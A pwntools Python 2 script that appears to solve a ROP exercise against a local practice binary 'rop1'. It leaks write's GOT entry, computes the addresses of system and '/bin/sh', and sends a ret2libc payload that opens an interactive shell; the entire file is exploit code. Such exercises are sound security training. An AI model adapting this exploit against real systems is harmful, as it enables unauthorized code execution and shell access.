#-*- coding: utf-8 -*-
from pwn import *

p = process(["./rop1"])
#elf = ELF('rop1')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')


write_plt = p32(0x08048320) # elf.plt['write']
write_got = p32(0x0804a014) # elf.got['write']
read_got = p32(0x0804a00c) 
addr_main = p32(0x0804843b)
addr_write =  0x0f7ef4460    # libc.symbols['write']
addr_system =  0x0f7e57310   # libc.symbols['system'] 
addr_binsh = 0xf7f79d4c        #/bin/sh
offset_system = addr_write-addr_system 
offset_binsh = addr_binsh-addr_write

sleep(0.4)
pause()
print p.recv()
#p.sendline("\n")

payload = "a"*52   #buf 
payload += write_plt 
payload += addr_main
payload += p32(1) #stdout
payload += write_got #dest
payload += p32(4) #byte

p.sendline(payload)

pause()
sleep(0.4)
leak_addr = u32(p.recv(4))

print hex(leak_addr) #leaked address
addr_system = leak_addr-offset_system
addr_binsh = leak_addr+offset_binsh

print p.recv()

payload2 = "a"*52
payload2 += p32(addr_system)
payload2 += "a"*4
payload2 += p32(addr_binsh)

p.sendline(payload2)

p.interactive()
